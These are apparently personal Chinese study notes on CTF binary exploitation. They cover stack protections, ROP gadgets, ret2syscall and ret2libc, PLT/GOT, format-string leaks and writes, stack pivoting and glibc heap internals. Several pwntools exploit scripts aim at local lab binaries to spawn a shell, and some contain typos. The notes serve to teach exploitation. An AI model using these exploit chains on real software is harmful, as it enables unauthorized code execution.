<p>关闭canary（堆栈共享库）pie(共享库编译时 将elf文件本体的载入地址随机化)  - 0输出目标文件<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307000253788.png" alt="image-20230307000253788"></p>
<p>给可执行文件权限 .&#x2F;运行shell<br>ctrl+c -&gt;向当前执行进程发送一个终止信号（复制ctrl+shift+c）<br>crl+d 退出当前shell<br>context.arch &#x3D; “amd64”(告诉py系统架构【系统位数】)<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230310080407959.png" alt="image-20230310080407959">关闭标准缓冲区得到输出值</p>
<p>system()函数调用&#x2F;bin&#x2F;sh来执行参数指定的命令，&#x2F;bin&#x2F;sh 一般是一个软连接，指向某个具体的shell，比如bash，-c选项是告诉shell从字符串command中读取命令； 在该command执行期间，SIGCHLD是被阻塞的，好比在说：hi，内核，这会不要给我送SIGCHLD信号，等我忙完再说； 在该command执行期间，SIGINT和SIGQUIT是被忽略的，意思是进程收到这两个信号后没有任何动作</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230325231231643.png" alt="image-20230325231231643"></p>
<p>动态链接库本身就是一个可执行文件。<br>my_puts函数输出过程（无各栈保护可考虑rop）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153211276.png" alt="image-20230409153211276"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153739815.png" alt="image-20230409153739815"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409163357731.png" alt="image-20230409163357731"></p>
<p>ROPgadget 获取text段所需汇编代码（ret——&gt;将栈中信息弹到eip中） eax、ebx优先【ROP总会至溢出retaddr后】</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230409171200929"></p>
<p>异或（xor）常用于清空缓冲区<br>flat()函数 接收一个列表参数将列表中的每一项都转为字节型数据并且自动把不足一字节数据进行填补</p>
<pre><code>io = flat（[b&#39;A&#39;*112,pop_eax_ret,0xb,pop_eax_ecx_ebx_ret,0,0,bin_sh,int_80h]）
</code></pre>
<p>grep功能：对输入行中含有用户自定参数的行进行全部输出</p>
<pre><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | head
</code></pre>
<p>sos 救大命踩坑！！！输入格式我哭死&#x2F;(ㄒoㄒ)&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230410210009493"></p>
<pre><code>ROPgadget  --binary ret2syscall --only &quot;pop|ret&quot; | grep eax
</code></pre>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230410194103144.png" alt="image-20230410194103144"></p>
<pre><code>ROPgadget --binary 文件名 --only &quot;int&quot;(执行系统调用 当为0x80时中断结束0x80表示进行系统调用的call)
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410201002577.png" alt="image-20230410201002577"></p>
<p>python3中必须用b转换为字节流型数据 generator转换器 next（）函数（前+hex转为十六进制）！！转化为十进制数据ww其实不如ROPgadget来的方便喽（目前个人觉得）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412210903759.png"></p>
<pre><code>ROPgadget --binary 文件名 --string &#39;/bin/sh&#39; (查询后门地址)
</code></pre>
<p>ret2text ret2shellcode 均直接含有后门函数 ret2text 自接收一串base64解码得flag ret2shellcode</p>
<pre><code>sys_execve() -&gt;0xb
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412204604894.png" alt="image-20230412204604894"><br>内核系统调用函数名                            用户调用代号<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214823229.png" alt="image-20230412214823229"></p>
<p>静态链接和动态链接<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214936627.png" alt="image-20230412214936627"></p>
<p>区别：<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412215132315.png" alt="image-20230412215132315"></p>
<p>静态链接方便找到gadget：静态链接将库函数全部写入elf文件本身 容易用指针片段构成攻击流<br>动态链接只是做了标记，用即拿（别处借xx例：printf调用vprintf【2000多行 还要再调吓人的嘞】）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230413185604877.png" alt="image-20230413185604877"></p>
<p>静态链接在链接时进行 动态链接在装载时进行</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414210446532.png" alt="image-20230414210446532"></p>
<p>puts函数动态链接在可执行段code载入（只为虚拟内存地址【libc全载入】但并不知真实地址）在运行时可找此时plt结解析使得puts内容填入data段got.plt文件【plt在代码段 got在数据段】</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414212714060.png" alt="image-20230414212714060"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214750326.png" alt="image-20230414214750326"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214800705.png" alt="image-20230414214800705"></p>
<pre><code>gcc -fro-pie -g -m32 -o link 动态链接文件名(32位)
gcc -fro-pie -g -0 link 动态链接文件名（64位）
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png"></p>
<p>查看plt  x 地址——&gt;以二进制形式查看</p>
<pre><code>pwndbg disass 地址-&gt;反汇编
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png" alt="image-20230414222605298"></p>
<p>info b 查看断点信息  b 行号可下断点（含C代码情况下） d 行号可删除断点【无C语言 b 地址下断点】<br>c 遇到下一个断点&#x2F;输入（puts）&#x2F;程序中断 </p>
<pre><code>b main == start 【若无main函数则停在程序入口第一条（start才为程序入口）】
s 步进 n 步过
backtrace 函数调用栈【呈现祖孙关系（😀）】
return 直接回到main函数
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415092539078.png" alt="image-20230415092539078"></p>
<pre><code>void secure()
&#123;
  unsigned int v0; // eax
  int input; // [esp+18h] [ebp-10h] BYREF
  int secretcode; // [esp+1Ch] [ebp-Ch]

  v0 = time(0);
  srand(v0);
  secretcode = rand();
  __isoc99_scanf(&quot;%d&quot;, &amp;input);
  if ( input == secretcode )
    system(&quot;shell!?&quot;);
&#125; //此处system函数虽无后门 但提供system plt表象 使得在text中可自动将执行流拉入libc段
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230418124940615"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230415100827595"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415101652128.png" alt="image-20230415101652128"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415112529947.png" alt="image-20230415112529947"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415114324006.png" alt="image-20230415114324006"></p>
<p>amd64向下兼容x86故含有eax<br>函数<strong>调用栈</strong>地址从高地址向低地址增长【更好的利用虚拟内存空间】（寄存器为低地址向高地址增长即先入后出）</p>
<p>【后续画图补充 好懒（我真该死啊 忘了的时候就知道动手记录了😶）】<strong>赎罪录：</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418130159741.png" alt="image-20230418130159741"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418132149276.png" alt="image-20230418132149276">画的太撇了（笑）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418132737386.png" alt="image-20230418132737386"></p>
<p>执行完调用返回dyntest（均在内存空间中）</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418133451380.png" alt="image-20230418133451380"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418205450196.png" alt="image-20230418205450196"></p>
<p><strong>【调用流程两点需注意】</strong>（x86例）</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418212246848.png" alt="image-20230418212246848"></p>
<p>father中也含有子函数所需arg<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418213125953.png" alt="image-20230418213125953"></p>
<p>查表易犯错误（直接调got）</p>
<pre><code>ret = system@got(❌)
</code></pre>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419201116801.png" alt="image-20230419201116801"></p>
<pre><code>elf = ELF(&quot;./dyntest&quot;)
[
  文件形式及保护
]
elf.got[&quot;puts&quot;]//获取函数表象地址
hex(elf.got[&quot;puts&quot;])//获取函数真实地址
</code></pre>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419203107813.png" alt="image-20230419203107813"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419215529699.png" alt="image-20230419215529699"></p>
<p>【nop slide】<br>使得ASLR继续执行ret2shellcode<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423182143460.png" alt="image-20230423182143460"></p>
<p>使执行流一直在nop段（maybe运气不好eip指不到nop位置 多运行几次即可）<br>core文件：记载程序崩溃时断点信息及错误信息<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230423193313158.png" alt="image-20230423193313158"></p>
<p>可以看成谁放的数据就为谁的栈帧<br>函数往上第二个字长写入其所需要的参数（大部分函数）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194347199.png" alt="image-20230423194347199"></p>
<p>system调用ret addr后自动push父函数ebp【函数内汇编第一步push ebp均向上写两字长到valuable】<br>最后两个函数执行此类模式即可完成攻击</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194601499.png" alt="image-20230423194601499"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194754995.png" alt="image-20230423194754995"></p>
<p>rop链将函数所需参数直接写入到上一函数的返回地址处<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424192129082.png" alt="image-20230424192129082"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424194313669.png" alt="image-20230424194313669"></p>
<p>无”&#x2F;bin&#x2F;sh”也可映射 system函数地址（text段 plt）若无plt则需持续溢出直至出现真实地址<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195822728.png"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195913266.png"></p>
<p>我是小偷 无需exit（）【偷完就跑】🤭</p>
<pre><code>strings ret2libc1 | grep /bin/sh
//string a.out | grep flag(简单逆向)
</code></pre>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424200850159.png" alt="image-20230424200850159"></p>
<p>【ret2libc1】<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205359479.png" alt="image-20230424205359479"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424204704035.png" alt="image-20230424204704035"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205428601.png" alt="image-20230424205428601">小小程序员&gt;&lt;<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424210938062.png" alt="image-20230424210938062"></p>
<p>动态调试108+4（ebp）溢出【ret2libc2】<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125354842.png" alt="image-20230425125354842"></p>
<p>无“&#x2F;bin&#x2F;sh” 此时需自行构造 在bss段找到可写入部分 </p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125119149.png" alt="image-20230425125119149">         </p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425153257042.png" alt="image-20230425153257042"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230426210301792.png" alt="image-20230426210301792"></p>
<p>进阶版思路</p>
<pre><code class="python">from pwn import *
io = process(&quot;./ret2libc2&quot;)

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat([b&#39;a&#39;*112,gets_plt,pop_ebx,buf2,system_plt,0xdeadbeef(pop_ebx),buf2])
#符合ret的寄存器均可不一定一定是pop_ebx
io.seneline(payload)
io.sendline(b&#39;/bin.sh&#39;)
io.interactieve()
</code></pre>
<p>【ret2libc3】</p>
<pre><code class="python"> v8 = strtol(&amp;buf, v4, v5); 将字符串转化为整数存储在v8里
 long int strtol(const char *str, char **endptr, int base)
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202338093.png" alt="image-20230427202338093"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202101873.png" alt="image-20230427202101873"><br>注意我们输送send的值要用str【程序接收的总是str】 linux系统下最小单位一叶（4kb）<br>&#x2F;bin&#x2F;sh(通过绝对地址输入bin中的sh)&#x3D;&#x3D;sh</p>
<pre><code class="python">from pwn import *

io = process(&quot;./ret2libc3&quot;)
elf = ELF(&quot;./ret2libc3&quot;)
libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)#lld ret2libc3查看本地libc(动态)

io.sendlineafter(b&quot; :&quot;,str(elf.got[&quot;puts&quot;]))#防bug与程序保持一致
io.recvuntil(b&quot; :&quot;)
libcBase = int(io.recvuntil(b&quot;\n&quot;,drop=True),16) - libc.symbols[&quot;puts&quot;]#drop=True不保留返回值（此处为接收但不保留\n）

success(&quot;libcBase -&gt;&#123;:#x&#125;&quot;,format(libcBase))#用来debug 结果正确后进行打印 &#123;:#&#125;格式化字符串
#format转换格式 前x表示转换为十六进制
#oneGadget = libcBase + 0x3a9fc

#payload = flat(cyclic(60),oneGadget)
payload=flat(cyclic(60),libcBase+libc.symbols[&quot;system&quot;],0xdeadbeef,next(elf.search(b&quot;sh\x00&quot;)))
io.sendlineafter(b&quot; :&quot;,payload)

io.interactive()
</code></pre>
<p>偏移：文件某一个位置距文件开头第一个字节距离</p>
<pre><code>one_gadget libc-2.23.so(动态链接文件名)-&gt;得偏移量 #碰运气喽😀
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230428193230160.png" alt="image-20230428193230160"></p>
<p>gdb调试<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230511094407053.png" alt="image-20230511094407053"></p>
<pre><code>set follow-fork-mode-parent 解决该问题（gdb中）
</code></pre>
<p>x64环境下传参要先传入六个寄存器中（rdi rsi rdx rcx r8 r9 ）<br>劫持程序返回到目的函数之前要先把目的函数的参数传递完毕（即传递参数的gadget放在目标函数之前）任何时候数据的写入都是从低地址向高地址写入<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520224921532.png" alt="image-20230520224921532"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520225916659.png" alt="image-20230520225916659"></p>
<p>一般有jz跳转提示（一长串pop 寄存器）**[lib_csu]**</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230521000849599"></p>
<p>注意看地址（如图中edi只可写低八位）<br>libc泄露技巧：找到关键函数（如write【返回时有栈溢出】）对应的的plt下got 用函数的真实地址-函数在libc中的地址&#x3D;libc基地址 -&gt;找system+“&#x2F;bin&#x2F;sh”偏移传入泄露<br>【level3】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230522173452594"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523002237695.png"></p>
<p>学会用转换捏io.recv(4&#x2F;8)</p>
<h3 id="【花式栈溢出】"><a href="#【花式栈溢出】" class="headerlink" title="【花式栈溢出】"></a><strong>【花式栈溢出】</strong></h3><p>1.程序中无真正main函数（dyn）<br>start-&gt;libc_start_mian-&gt;init-&gt;main<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101555442.png" alt="image-20230523101555442"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101634224.png" alt="image-20230523101634224"></p>
<p>此时栈中无栈帧 全部存储的shell里的环境变量 其中记录了当前执行程序的名字<br>找程序入口：IDA（可爱女人）main地址 gdbzho中下断点调试 stack查看栈帧<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104215828.png" alt="image-20230523104215828"></p>
<p>checksecc 发现canary打开 <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104710354.png" alt="image-20230523104710354"></p>
<p>运行程序 手动超长溢出（可利用python）查看提示 【可从IDA中辅助分析】</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523105629335.png" alt="image-20230523105629335"></p>
<p>之前为segment fault 现why为stack samshing<br>覆盖后触发stack_chk_fail函数 强行退出程序 -&gt;stack smashing</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523114523470.png" alt="image-20230523114523470"><br>如何在可爱女人中观察到Canary？<br>标志：段寄存器读入</p>
<pre><code>v4 = _readfsqword(0x28) //🌰
</code></pre>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230523122130079.png" alt="image-20230523122130079"></p>
<p>Canary放置无硬性标准 需分析<br>elf文件较小时 地址可能在虚拟地址中映射两份<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610163822498.png" alt="image-20230610163822498"></p>
<p>strip去掉函数名——&gt;防护程序 （IDA中自动用偏移作为函数名）<br>此时无“main”函数【gdb中断点下不了】</p>
<p><strong>【栈迁移】</strong></p>
<p>花样很多啦 栈欺骗<br>利用gadget覆盖ebp 恶意代码写在ebp中【pop ret&#x2F;mov esp，ebp】ebp辅佐esp<br>esp抹除数据 ebp增加 控制esp即可<br><strong>pwn3_x64</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182043459.png" alt="image-20230610182043459"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182053082.png" alt="image-20230610182053082"></p>
<p>write第三个参数无法获取时 运气（猜rdx&gt;8）</p>
<p>ret需要给显示屏即标准输出 1是标准输出的代号</p>
<p><strong>格式化字符串</strong>（保存在栈上）</p>
<pre><code class="c">#include &lt;stdio.h&gt;
int main()
&#123;
char s[100];
int a = 1;
int b = 0x22222222;
int c = -1;
scanf(&quot;%s&quot;,s);
printf(&quot;%08x.%08x.%08x.%s\n&quot;,a.b,c,s);//第一个参数即为格式化字符串（%08x.）
printf(s);
return 0;
&#125;
</code></pre>
<p>不给参数情况下 会直接将栈中内容进行打印</p>
<p>格式化字符串攻防中printf（”%s%s%s(足够长即可使得程序崩溃)”）</p>
<p><strong>字符串截断漏洞主体利用思想</strong>：</p>
<p> 截断符的篡改或抹去（让函数误解程序未执行完毕）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225648504.png" alt="image-20230615225648504"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225717582.png" alt="image-20230615225717582"></p>
<pre><code>%p溢出---&gt;实际将栈上重要数据进行打印（如地址）可用于绕过canary
%s溢出---&gt;解析栈打印其中内容 ---&gt;泄露任意地址
泄露任意地址：
1.泄露栈上本身存在的地址（如read@got）
2.泄露垃圾数据（篡改喽）再read@got
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615232327380.png" alt="image-20230615232327380"></p>
<p>为避免flag和格式化字符串第一个参数距离很远直接传地址即可（printf（”%100$d”,a,b,c））</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616002416632.png" alt="image-20230616002416632"></p>
<pre><code class="c">#include&lt;stdio.h&gt;
int main()
&#123;
int a = 1;
int b = 2;
int c = 3;
printf(&quot;%3$d&quot;,a,b,c);//打印出3  $n---&gt;打印出第几个参数
return 0;
&#125;
</code></pre>
<p>%d —-&gt;打印有符号整型  -140….对应0xf（要么为动态链接库中地址 要么为栈上地址）<br><img src="https://cdn.jsdelivr.net/gh/yub/First@main/image-20230616134523270.png" alt="image-20230616134523270"></p>
<p>逐参打印</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616134746197.png" alt="image-20230616134746197"></p>
<p>%n—-&gt;解析地址对应内容 —-写入前方已经打印成功的字符个数（任意地址写）<br>%n 写入4字节0x00000004<br>%hn写入两字节0x0004<br>%hhn写入一字节0x04<br>printf的第n+1个参数是格式化字符串的第n个参数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616162630147.png" alt="image-20230616162630147"></p>
<p>0x0b &#x3D; 11也可以说明为第十一个参数<br>空行部分相当于对填入数据的打印<br>关键：找read函数判断写入数据为格式化字符串第几个参数<br>x86可以直接数 x64前6个参数在寄存器中第7个才在栈上</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616170955472.png" alt="image-20230616170955472"></p>
<p>x64直接利用找参数位置 可暴力打印%7$p%8$p%9$p(仅为举例)<br>前6个参数在寄存器中 rsp为第7个—&gt;对应n+1printf（flag）和n格式化字符串关系找到位置</p>
<p><strong>堆</strong><br>作用：给用户随时提供可使用的内存 用完后归还</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616174226840.png" alt="image-20230616174226840"></p>
<p>堆管理器—&gt;中间人</p>
<p>堆管理器并非由操作系统实现,而是由libc.so.6链接库实现。封装了一些系统调用﹐为用户提供方便的动态内存分配接口的同时﹐力求高效地管理由系统调用申请来的内存。</p>
<p>申请内存系统调用：<br>brk（data段末尾向上扩展调用）主线程系统调用<br>mmap（内存&#x2F;磁盘映射）</p>
<p>决定要素：主线程brk和mmap都可用<br>                   子线程只可用mmap<br>子线程申请空间过大在mmap段映射 小可直接在data段开辟<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616175743170.png" alt="image-20230616175743170"></p>
<p>malloc用户向堆管理器要内存 brk和mmap向操作系统申请</p>
<p><strong>arena</strong>（将物理内存映射到虚拟内存空间存储管理）<br>内存分配区，可以理解为堆管理器所持有的内存池</p>
<pre><code>操作系统--&gt;堆管理器--&gt;用户
物理内存--&gt;arena--&gt;可用内存
</code></pre>
<p>堆管理器与用户的内存交易发生于arena中（堆管理器向操作系统批发来的有冗余的内存库）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233511677.png" alt="image-20230618233511677"></p>
<p><strong>chunk</strong>（内存分配的最小单位 不可能小于8字节【两字长16字节（x64）】x32大小）<br>用户申请内存的单位，也是堆管理器管理内存的基本单位<br>malloc（）返回的指针指向一个chunk的数据区域 chunk大小 大于malloc分配大小<br>chunk分配规律：只能分配字长整数倍大小—&gt;size低三位一定为0</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617134142917.png" alt="image-20230617134142917"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617140647896.png" alt="image-20230617140647896"></p>
<p>free chunk<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234752208.png" alt="image-20230617234752208"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617143930107.png" alt="image-20230617143930107"></p>
<p>注意在size低三位有三个控制字段<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230617145200469.png" alt="image-20230617145200469"></p>
<p>A：主线程 M：是否为mmap P：用于free chunk（为1–&gt;前一个chunk被写入数据即前一个chunk为malloc chunk 为0则前一个chunk为free chunk）1–&gt;前一个chunk被占用 0–&gt;前一个chunk pre-in-use</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617152524631.png" alt="image-20230617152524631"></p>
<p>fastbin free chunk 四字段控制结构 smallbin free chunk 四字段控制结构<br>bigbin free chunk 六字段控制结构</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617215936729.png" alt="image-20230617215936729"><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233738837.png" alt="image-20230618233738837"></p>
<p>fast bins独立于其他几个bins 压栈出栈即可<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235205771.png" alt="image-20230617235205771"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235515996.png" alt="image-20230617235515996"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617220021172.png" alt="image-20230617220021172"></p>
<p>large bin free chunk 6个字段全部用到<br>malloc chunk 用前两个<br>malloc chunk前面还是malloc chunk时只用到第二个字段<br>small bin free chunk allocated chunk用前4个字段<br>fast bin free chunk 用前3个字段<br>经过第一次malloc后堆管理器才完成初始化<br>页对齐 页的大小是4kb 4kb需要2^12映射空间 12bits为3bytes变成3个0<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222745908.png" alt="image-20230617222745908"></p>
<p>x64最下chunk单位（0x20大小）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222844117.png" alt="image-20230617222844117"></p>
<p>x86 同理得最小大小为0x10（切一半）<br>控制字段不可填写 堆管理器满足用户需求向操作系统申请0x100大小实际申请chunk大小为0x110（pre size+size 两字长 16bits 0x10大小）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617223313606.png" alt="image-20230617223313606"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617225749420.png" alt="image-20230617225749420"></p>
<pre><code class="c">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
int main()
&#123;
void *ptr = malloc(0x100);
free(ptr);
&#125;
</code></pre>
<p>malloc得到的函数指针指向size （图中）但chunk开头的地址是</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617230144174.png" alt="image-20230617230144174"></p>
<p>其他chunk为程序自身利用缓冲区提供（如：printf函数 【未指定stdout缓冲区时 printf函数默认用malloc得到一个堆中的缓冲区为stdout所用】）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617231321789.png" alt="image-20230617231321789"></p>
<p>程序读取时以一条语句为单位 size大小为申请的0x100+prev size+size（两字长）此时p已被程序员复用 即此时总size大小（总chunk大小 0x100为malloc chunk大小）为0x111</p>
<p><strong>previous size复用</strong><br>prev size针对free chunk 即存储上一个free chunk<br>当上一个chunk不为fastbin free chunk时（为malloc chunk）prev chunk可被复用<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233352292.png" alt="image-20230617233352292"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233454554.png" alt="image-20230617233454554"></p>
<p>以上变化chunk变化相同 8字节申请的大小为字长奇数倍分配空间&#x3D;申请到的字长数-1malloc分配空间大小<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105030445.png" alt="image-20230618105030445"></p>
<p>0x100数据区域的大小 0x10为控制字段的大小 1 prev in use 位大小</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105235986.png" alt="image-20230618105235986"></p>
<p>放在fast bin 中的free chunk仍会被标记为在使用中（fast bin p位恒为1）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105723997.png" alt="image-20230618105723997"></p>
<p><strong>物理链表</strong>【相邻chunk间size域连接（整数）】</p>
<p>通过prev size串联起来（获取前一个chunk地址）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234705813.png" alt="image-20230617234705813"></p>
<p><strong>逻辑链表</strong>（存在于bins中）【指针连接】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111056657.png" alt="image-20230618111056657"></p>
<p>每一个bin都含有对应的链表 构成的bins链表称为逻辑链表<br>同类chunk串联到回收站中 malloc索取相应大小时可高效从回收站中提取</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111551403.png" alt="image-20230618111551403"></p>
<p><strong>bin</strong><br>（临时【系统需要时可用】）保存刚被free后内存区域的结构（堆管理器中）<br>管理arena中空闲chunk的结构<br>以数组的形式存在 数组元素为相应大小的chunk链表的链表头<br>存在于arena的malloc_state中<br>如：<br>unsorted bin<br>fast bins<br>small bins<br>large bins<br> (tcache)<br><strong>除fast bin和tcache为单向链表 其余bins均为双向链表</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618230718261.png" alt="image-20230618230718261"><br>unsorted bin smallbin largebin双向链表结构bin利用:<br>🤖malloc分配时<br>🍰获取很大chunk时优先从回收站中拿取 unsorted bins变为sorted bins使用<br>双向链接：先进先出（图上自上而下malloc）<br>好处：队列底部压入数据 头部取出数据 一条链表就可处理数据<br>small bin（大小固定）<br>一个bin存储两个地址 物理内存中连续 把所有chunk串联</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235211411.png" alt="image-20230618235211411"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235427918.png" alt="image-20230618235427918"><br>large bins（大小不定【每一chunk大小不一】 最后一个chunk存储最后值）<br>大小为范围 —&gt;用两个额外的控制域记录数据<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235448673.png" alt="image-20230618235448673"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618234942479.png" alt="image-20230618234942479"></p>
